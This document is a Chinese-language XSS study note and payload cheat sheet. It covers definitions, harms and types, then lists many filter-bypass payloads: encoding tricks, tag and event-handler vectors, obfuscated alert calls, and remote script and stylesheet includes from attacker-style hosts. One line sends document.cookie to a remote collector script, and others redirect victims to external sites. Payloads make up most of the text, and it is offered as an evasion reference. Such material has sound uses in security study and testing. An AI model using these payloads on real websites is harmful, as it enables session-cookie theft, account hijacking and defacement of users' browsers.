#                                  XSS

* ## XSS定义

跨站脚本（Cross-site scripting，XSS）是对网页代码（包含HTML以及前端脚本）有漏洞的网站进行的攻击，是代码注入的一种。它允许恶意代码被注入到网页上，其他使用者在访问网页时就会受
到影响。攻击成功后，攻击者可能得 到更高的权限、私密网页内容、会话和cookie等各种内容。 

> 提示
>
> > XSS属于客户端攻击，受害者最终是用户。但不要忘记网站管理人员也属于用户之一，管理员拥有着太多权限，一般管理员都可以对网站进行文件管理、数据管理等操作，攻击者就有可能靠管理员身份作为跳板实施攻击。

* ## 原理

  XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般使用JavaScript语言编写JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，存在XSS漏洞的网站，可以盗取用户Cookie、黑掉页面、导航到恶意网站，攻击者仅仅需要向web页面注入JavaScript代码

* ## XSS常见出现漏洞的地方

  1. 数据交互的地方
     - get、post、cookies、headers
     - 反馈与浏览
     - 富文本编辑器
     - 各类标签插入和自定义
  2. 数据输出的地方
     - 用户资料
     - 关键词、标签、说明
     - 文件上传

* ## 危害

  - 网络钓鱼，包括获取各类用户账号；
  - 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；
  - 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；
  - 强制弹出广告页面、刷流量等；
  - 网页挂马；
  - 进行恶意操作，如任意篡改页面信息、删除文章等；
  - 进行大量的客户端攻击，如ddos等；
  - 获取客户端信息，如用户的浏览历史、真实ip、开放端口等；
  - 控制受害者机器向其他网站发起攻击；
  - 结合其他漏洞，如csrf,实施进一步危害；
  - 提升用户权限，包括进一步渗透网站；
  - 传播跨站脚本蠕虫等

* ## 分类

  1. 反射型（不储存于服务器，非持久）
  2. 储存性（粗存于服务器，持久性）
  3. DOM型（改变DOM结构）（DOM本身代表文档，给予DOM型的XSS不需要与服务器交互，只发生在客户端处理数据阶段）![image-20201229221502057](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229221502057.png)

- ## 漏洞利用

 1.盗取cookie： 

```
<script>alert(document.cookie)</script>
```

 2.构造页面跳转： 

```
<script>location='https://www.hacker.com'</script>
```

 3.构造获取cookie并发送到远程主机： 

```javascript
<script>document.location='http://127.0.0.1/test/cookie.phpcookie='+document.cookie</script>
```

- ### 常见注入点

1、输入框

2、留言板

3、URL中可传参数的变量

* ### 触发JS解析器的方式：

  1. 直接嵌入<script>代码块。
2. 通过src属性加载代码。
  3. 行内样式
  4. 各种HTML CSS参数支持JavaScript：URL伪协议触发调用。
  5. 事件处理器，如：onload，onerror，onclick等。
  6. 定时器，timer（setTimeout，setInterval）
  7. eval(...)调用

* ## 过滤与绕过

  ### 1. 闭合引号、标签

  ### 2. 关键字、符号过滤

- 反引号代替圆括号

- 换行、空格、Tab绕过正则

- <!--不仅可以用-->,也可以用--!>闭合

- //可以用换行来绕过

- <!--和-->都可以在html的script标签里单独使用进行单行注释

- ſ 符号转换为大写后正好为大写字母 S

- 可以用 %0a 代替空格进行绕过

- 用 / 代替空格

- 不闭合标签
  -   <  代替  >  闭合标签
  ```javascript
  <iframe src=http://xss.rocks/scriptlet.html <
  ```
  - firefox 自动补全标签
  ```javascript
  <SCRIPT SRC=http://xss.rocks/xss.js?< B >
  ```
  - 被限制长度，浏览器可识别 .j 

    ```javascript
    <SCRIPT SRC=//xss.rocks/.j>
    ```

  -  IE中用以下符号代替>闭合标签

  ```javascript
  /((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/
  ```

- 额外的无关括号

  ```javascript
  <<SCRIPT>alert("XSS");//\<</SCRIPT>
  ```

- 大小写

- Non-alpha-non-digit XSS（⑧懂）

  ```javascript
  <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
  ```

  ```javascript
  <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
  ```

- ”覆盖变量“

  ```javascript
  \";alert('XSS');//
  ```

  > 效果：
  >
  > ```javascript
  > <SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>
  > ```

- 双写、拼凑

- 当括号被过滤的时候可以使用throw来绕过

  > ```javascript
  > <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
  > ```

- 如果是html标签中，可以不用引号；如果是在js中，可以用反引号代替单双引号。

- 字符拼接
  
> 利用eval
> ```javascript
> <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
> ```
>
> 利用top
>
> ```
> <script>top["al"+"ert"](`xss`);</script>
> ```

- 干扰字符（任意位置插入null字符）
> ```javascript
  ><im[%00]g onerror=alert(xss) src=a>
> ```
- html标签中用`//`可以代替`http://`

  ```javascript
  <img src="x" onerror=document.location=`//www.baidu.com`>
  ```

- 使用`\\`

  ```javascript
  但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
  ```

- 使用中文逗号代替英文逗号

  > 如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号 

  ```javascript
  <img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
  ```

- 其它字符混淆

> 有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们> > 就可以使用其它字符去混淆我们注入的代码了
> 下面举几个简单的例子
>
> > 可利用注释、标签的优先级等
```javascript
<<script>alert("xss");//<</script>
<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```
### 3. 编码绕过

* url编码，JavaScript编码  （在src等属性标签下可用，”JavaScript“本身不能编码）
  
  |     进制      |       格式       |
  | :-----------: | :--------------: |
  |  ascll(默认)  |       %00        |
  |    八进制     | \0(三位不足补零) |
  |    十六进     |       \x00       |
  | unicode编码制 |      \u0000      |
  |    base64     |       如下       |
  
  ```javascript
  <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
  ```
  
* HTML实体（对大小写敏感，**分号没必要，最大7位填充，0可忽略**）
  
    [html实体码转码](https://www.qqxiuzi.cn/bianma/zifushiti.php "实体码，记得预留字符转命名实体")
  
    ![image-20201229232607711](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229232607711.png)

  

* 宽字节绕过

* 复合编码

* String.fromCharCode编码

      如alert编码为：
      
      ```javascript
      String.fromCharCode(97,108,101,114,116)
      ```

* JavaScript转义（在src等属性标签下可用，”JavaScript“本身不能编码）

    ```javascript
  <a href=javascript:eval(alert('xss'))>aa</a>
  ```
  
* java alert encode**(编码最多是7位填充，包括)**

  ```javascript
  <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
  ```


- expression属性

  ```
  <img style="xss:expression(alert('xss''))"> // IE7以下
  <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
  <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
  ```

- US-ASCII Encoding

  > US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII  encoding with 7 bits instead of 8. This XSS may bypass many content  filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web  application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits  in US-ASCII encoding.

  ```
  ¼script¾alert(¢XSS¢)¼/script¾
  ```



#### 4. 外部标签

  ---> <svg>属于外部标签，是一种特殊的标签，它使用XML格式定义图像，XML支持在标签内解析HTML实体字符，所以在XML中可以执行。
```javascript
<svg><script>alert(&#40;'1'&#41;</script>)
```

##### 浏览器解码顺序

html解码 ---> JavaScript解码 ---> url解码 ---> 发送http请求

![image-20201229223632254](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20201229223632254.png)


### 5. 使用IP

  **1.十进制IP**

```javascript
<img src="x" onerror=document.location=`http://2130706433/`>
```

  **2.八进制IP**

```javascript
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

  **3.hex**

```javascript
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```



#### 6. CSS import

IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。
 ```javascript
 <style>
 @import url("http://attacker.org/malicious.css");
 </style>
 ```
 **malicious.css：**
```javascript
 body {
   color: expression(alert('XSS'));
 }
```
**为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：**

 ```javascript
 <style>
 @imp\ort url("http://attacker.org/malicious.css");
 </style>
 ```
 IE 浏览器会接受反斜杠，但是我们绕过了过滤器。



### 7. JavaScript伪协议

**---><a>标签**

```javascript
<a href="javascript:alert(`xss`);">xss</a>
```

**---><iframe>标签**

```javascript
<iframe src=javascript:alert('xss');></iframe>
```

**---><img>标签**

```javascript
<img src=javascript:alert('xss')>//IE7以下
```

**---><form>标签**


```javascript
<form action="Javascript:alert(1)"><input type=submit>
```



###  **8. 利用link远程包含js文件**

> PS：在无CSP的情况下才可以

  ```
<link rel=import href="http://127.0.0.1/1.js">
  ```

> rename .js

```
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```



### 9. 其它

**--->UTF-7 Encoding**

> If the page that the XSS resides on doesn’t provide a page charset  header, or any browser that is set to UTF-7 encoding can be exploited  with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don’t need the charset statement if the user’s browser  is set to auto-detect and there is no overriding content-types on the  page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding  type which is why it is marked as completely unsupported. Watchfire  found this hole in Google’s custom 404 script.:

```
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
```

**--->Cookie Manipulation**

> Admittedly this is pretty obscure but I have seen a few examples where `<META` is allowed and you can use it to overwrite cookies. There are other  examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who  visits the page. With these two scenarios combined you can modify the  victim’s cookie which will be displayed back to them as JavaScript (you  can also use this to log people out or change their user states, get  them to log in as you, etc…):

```
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

**--->PHP**

> Requires PHP to be installed on the server to use this XSS vector.  Again, if you can run any scripts remotely like this, there are probably much more dire issues:

```javascript
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

**--->EMBED a Flash Movie That Contains XSS**

> Click here for a demo: ~~http://ha.ckers.org/xss.swf~~

```
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
```

> firefox

```
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

**--->Downlevel-Hidden Block**

> Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be  safe and therefore does not need to be removed, which allows our Cross  Site Scripting vector. Or the system could add comment tags around  something to attempt to render it harmless. As we can see, that probably wouldn’t do the job:

```
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

**--->background属性**

```javascript
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
```

**--->XSS Locator**

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

```javascript
<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>
```

**--->Malformed IMG Tags**

```javascript
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

**--->Livescript (older versions of Netscape only)**

```javascript
<IMG SRC="livescript:[code]">
```

**--->VBscript in an Image**

```javascript
<IMG SRC='vbscript:msgbox("XSS")'>
```

**--->List-style-image**

> Fairly esoteric issue dealing with embedding images for bulleted  lists. This will only work in the **IE** rendering engine because of the  JavaScript directive. Not a particularly useful cross site scripting  vector:

```javascript
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

**--->ECMAScript 6**

```javascript
Set.constructor`alert\x28document.domain\x29
```

**--->BGSOUND**

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```

**--->& JavaScript includes**

```javascript
<BR SIZE="&{alert('XSS')}">
```

**--->STYLE sheet**

```javascript
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### 10. 各种标签

   **---><script>标签：**
```javascript
<script>alert(/1/)</script>
<script>prompt(1)</script> 
<script>confirm(1)</script>
<script src="http://attacker.org/malicious.js"></script>
<script src=data:text/javascript,alert(1)></script>
<script>setTimeout(alert(1),0)</script>
```
   **---><a>标签：**

```javascript
<a href="javascript:alert(1)">点击触发</a>
<a href="http://www.hacker.com">点击触发</a>
```

  **---><img>**

  ```javascript
  <img src=1 onerror=alert("xss");>
  ```

> Default SRC Tag to Get Past Filters that Check SRC Domain
>
> ```javascript
> <IMG SRC=# onmouseover="alert('xxs')">
> ```
>
> Default SRC Tag by Leaving it Empty
>
> ```javascript
> <IMG SRC= onmouseover="alert('xxs')">
> ```
>
> Default SRC Tag by Leaving it out Entirely
>
> ```javascript
> <IMG onmouseover="alert('xxs')">
> ```
>
> IMG Lowsre
>
> ```javascript
> <IMG LOWSRC="javascript:alert('XSS')">
> ```
>
> IMG Dynsrc
>
> ```javascript
> <IMG DYNSRC="javascript:alert('XSS')">
> ```
>
> On Error Alert
>
> ```javascript
> <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
> ```

**---><input>**

  ```
  <input onfocus="alert('xss');">
  竞争焦点，从而触发onblur事件
  <input onblur=alert("xss") autofocus><input autofocus>
  通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
  ```

**---><details>**


```
  <details ontoggle="alert('xss');">
  使用open属性触发ontoggle事件，无需用户去触发
  <details open ontoggle="alert('xss');">
```

**---><svg>**


  ```
  <svg onload=alert("xss");>
  ```

**---><select>**

  ```
  <select onfocus=alert(1)></select>
  通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
  <select onfocus=alert(1) autofocus>
  ```

**---><iframe>**

  ```
  <iframe onload=alert("xss");></iframe>
  ```

**---><video>**

  ```
  <video><source onerror="alert(1)">
  ```

**---><audio>**

  ```
  <audio src=x  onerror=alert("xss");>
  ```

**---><body>**

  ```
  <body/onload=alert("xss");>
  ```

> 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

  ```
  <body
  onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
  ```

**---><textarea>**

  ```
  <textarea onfocus=alert("xss"); autofocus>
  ```

**---><keygen>**

  ```
  <keygen autofocus onfocus=alert(1)> //仅限火狐
  ```

**---><marquee>**

  ```
  <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
  ```

**---><isindex>**

  ```
  <isindex type=image src=1 onerror=alert("xss")>//仅限于IE
  ```

**---><style>(限制较多)**

**Remote style sheet**

> Using something as simple as a remote style sheet you can include  your XSS as the style parameter can be redefined using an embedded  expression. This only works in IE and Netscape 8.1+ in IE rendering  engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet  examples they use the body tag, so it won’t work unless there is some  content on the page other than the vector itself, so you’ll need to add a single letter to the page to make it work if it’s an otherwise blank  page:

```
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

**Remote style sheet part 2**

> This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is  useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real  world:

```
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

**Remote style sheet part 3**

> This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1  spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no  different than in the HTTP header saying `Link: <http://xss.rocks/xss.css>; REL=stylesheet`) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:

```
<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
```

**Remote style sheet part 4**

> This only works in Gecko rendering engines and works by binding an  XUL file to the parent page. I think the irony here is that Netscape  assumes that Gecko is safer and therefor is vulnerable to this for the  vast majority of sites:

```
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

**STYLE Tags with Broken-up JavaScript for XSS**

> This XSS at times sends IE into an infinite loop of alerts:

```
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

**STYLE Attribute using a Comment to Break-up Expression**

> Created by Roman Ivanov

```
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

**IMG STYLE with Expression**

> This is really a hybrid of the above XSS vectors, but it really does  show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:

```
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

**STYLE Tag (Older versions of Netscape only)**

```
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
```

**STYLE Tag using Background-image**

```
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

**STYLE Tag using Background**

```
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>` `<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

**Anonymous HTML with STYLE Attribute**

IE6.0 and Netscape 8.1+ in IE rendering engine mode don’t really care if the HTML tag you build exists or not, as long as it starts with an  open angle bracket and a letter:

```
<XSS STYLE="xss:expression(alert('XSS'))">
```

**---><META>**

> The odd thing about meta refresh is that it doesn’t send a referrer  in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:

```
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

**META using Data**

> Directive URL scheme. This is nice because it also doesn’t have  anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more  details or go here or here to encode your own. You can also use the XSS [calculator](http://ha.ckers.org/xsscalc.html) below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:

```
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

**META with Additional URL Parameter**

> If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):

```
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

**---><TD>**

```
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

**---><DIV>**

```
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

**---><BASE>**

```
<BASE HREF="javascript:alert('XSS');//">
```

**---><OBJECT>**

> If they allow objects, you can also inject virus payloads to infect  the users, etc. and same with the APPLET tag). The linked file is  actually an HTML file that can contain your XSS:

```
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

**---><XML>**

> This XSS attack works only in IE and Netscape 8.1 in IE rendering  engine mode) - vector found by Sec Consult while auditing Yahoo:

```
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

> 例：
>
> > ```javascript
> > <script>alert(navigator.userAgent)<script> <script>alert(88199)</script> <script>confirm(88199)</script> <script>prompt(88199)</script> <script>\u0061\u006C\u0065\u0072\u0074(88199)</script> <script>+alert(88199)</script> <script>alert(/88199/)</script> 
> > <script src=data:text/javascript,alert(88199)></script> 
> > <script src=&#100&#97&#116&#97:text/javascript,alert(88199)></script> <script>alert(String.fromCharCode(49,49))</script> <script>alert(/88199/.source)</script> <script>setTimeout(alert(88199),0)</script> 
> > <script>document['write'](88199);</script> 
> > <anytag οnmοuseοver=alert(15)>M 
> > <anytag οnclick=alert(16)>M 
> > <a οnmοuseοver=alert(17)>M 
> > <a οnclick=alert(18)>M 
> > <a href=javascript:alert(19)>M 
> > <button/οnclick=alert(20)>M 
> > <form><button formaction=javascript&colon;alert(21)>M <form/action=javascript:alert(22)><input/type=submit> 
> > <form οnsubmit=alert(23)><button>M 
> > <form οnsubmit=alert(23)><button>M 
> > <img src=x οnerrοr=alert(24)> 29 
> > <body/οnlοad=alert(25)> 
> > <body οnscrοll=alert(26)><br><br><br><br><br><br><br> <br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><br><br><br><br><br><br> <input autofocus> <iframe src="http://0x.lv/xss.swf"></iframe> 
> > <iframe/οnlοad=alert(document.domain)></iframe> 
> > <IFRAME SRC="javascript:alert(29);"></IFRAME> 
> > <meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"> 
> > <object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object> 
> > <object data="javascript:alert(document.domain)"> 
> > <marquee onstart=alert(30)></marquee> 
> > <isindex type=image src=1 οnerrοr=alert(31)> 
> > <isindex action=javascript:alert(32) type=image> 
> > <input οnfοcus=alert(33) autofocus> 
> > <input οnblur=alert(34) autofocus><input autofocus>
> >     
> > //关键字和编码结合
> > <IMG SRC="jav&#x0A;ascript:alert('XSS');"> //换行
> > <IMG SRC="jav&#x0D;ascript:alert('XSS');"> //空格
> > <IMG SRC="jav&#x09;ascript:alert('XSS');"> //Tab
> > ```

### 11. Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`

###  **常用事件：** 


  onclick: 点击触发
  ```
  （<img src=x onclick=alert(1)>）
  ```

  onerror: 当 src 加载不出来时触发
  ```
  （<img src=x onerror=alert(1)>）
  ```

  onload: 当 src 加载完毕触发
  ```
  （<img src=x onload=alert(1)>）
  ```

  onmouseover：鼠标移动到图片后触发
  ```
  （<img src=x onmouseover=alert(1)>）
  ```

  onmousemove: 鼠标移到指定元素触发
  ```
  （<img src=x onmousemove=alert(1) >）
  ```

  onfocus: 当input 输入框获取焦点时触发
  ```
  （<input onfocus=javascript:alert(1) autofocus>）
  ```



### [事件列表](http://help.dottoro.com/ljfvvdnm.php)

1. `FSCommand()` (attacker can use this when executed from within an embedded Flash object)
2. `onAbort()` (when user aborts the loading of an image)
3. `onActivate()` (when object is set as the active element)
4. `onAfterPrint()` (activates after user prints or previews print job)
5. `onAfterUpdate()` (activates on data object after updating data in the source object)
6. `onBeforeActivate()` (fires before the object is set as the active element)
7. `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
8. `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
9. `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
10. `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a  UI-activated state or when an editable container object is control  selected)
11. `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
12. `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
13. `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
14. `onBeforeUpdate()` (activates on data object before updating data in the source object)
15. `onBegin()` (the onbegin event fires immediately when the element’s timeline begins)
16. `onBlur()` (in the case where another popup is loaded and window looses focus)
17. `onBounce()` (fires when the behavior property of the marquee object is set to  “alternate” and the contents of the marquee reach one side of the  window)
18. `onCellChange()` (fires when data changes in the data provider)
19. `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
20. `onClick()` (someone clicks on a form)
21. `onContextMenu()` (user would need to right click on attack area)
22. `onControlSelect()` (fires when the user is about to make a control selection of the object)
23. `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
24. `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
25. `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
26. `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
27. `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
28. `onDblClick()` (user double-clicks a form element or a link)
29. `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
30. `onDrag()` (requires that the user drags an object)
31. `onDragEnd()` (requires that the user drags an object)
32. `onDragLeave()` (requires that the user drags an object off a valid location)
33. `onDragEnter()` (requires that the user drags an object into a valid location)
34. `onDragOver()` (requires that the user drags an object into a valid location)
35. `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
36. `onDragStart()` (occurs when user starts drag operation)
37. `onDrop()` (user drops an object (e.g. file) onto the browser window)
38. `onEnd()` (the onEnd event fires when the timeline ends.
39. `onError()` (loading of a document or image causes an error)
40. `onErrorUpdate()` (fires on a databound object when an error occurs while updating the associated data in the data source object)
41. `onFilterChange()` (fires when a visual filter completes state change)
42. `onFinish()` (attacker can create the exploit when marquee is finished looping)
43. `onFocus()` (attacker executes the attack string when the window gets focus)
44. `onFocusIn()` (attacker executes the attack string when window gets focus)
45. `onFocusOut()` (attacker executes the attack string when window looses focus)
46. `onHashChange()` (fires when the fragment identifier part of the document’s current address changed)
47. `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
48. `onInput()` (the text content of an element is changed through the user interface)
49. `onKeyDown()` (user depresses a key)
50. `onKeyPress()` (user presses or holds down a key)
51. `onKeyUp()` (user releases a key)
52. `onLayoutComplete()` (user would have to print or print preview)
53. `onLoad()` (attacker executes the attack string after the window loads)
54. `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
55. `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
56. `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
57. `onMessage()` (fire when the document received a message)
58. `onMouseDown()` (the attacker would need to get the user to click on an image)
59. `onMouseEnter()` (cursor moves over an object or area)
60. `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
61. `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
62. `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
63. `onMouseOver()` (cursor moves over an object or area)
64. `onMouseUp()` (the attacker would need to get the user to click on an image)
65. `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
66. `onMove()` (user or attacker would move the page)
67. `onMoveEnd()` (user or attacker would move the page)
68. `onMoveStart()` (user or attacker would move the page)
69. `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
70. `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
71. `onOutOfSync()` (interrupt the element’s ability to play its media as defined by the timeline)
72. `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
73. `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
74. `onPopState()` (fires when user navigated the session history)
75. `onProgress()` (attacker would use this as a flash movie was loading)
76. `onPropertyChange()` (user or attacker would need to change an element property)
77. `onReadyStateChange()` (user or attacker would need to change an element property)
78. `onRedo()` (user went forward in undo transaction history)
79. `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
80. `onReset()` (user or attacker resets a form)
81. `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
82. `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
83. `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
84. `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
85. `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
86. `onRowsEnter()` (user or attacker would need to change a row in a data source)
87. `onRowExit()` (user or attacker would need to change a row in a data source)
88. `onRowDelete()` (user or attacker would need to delete a row in a data source)
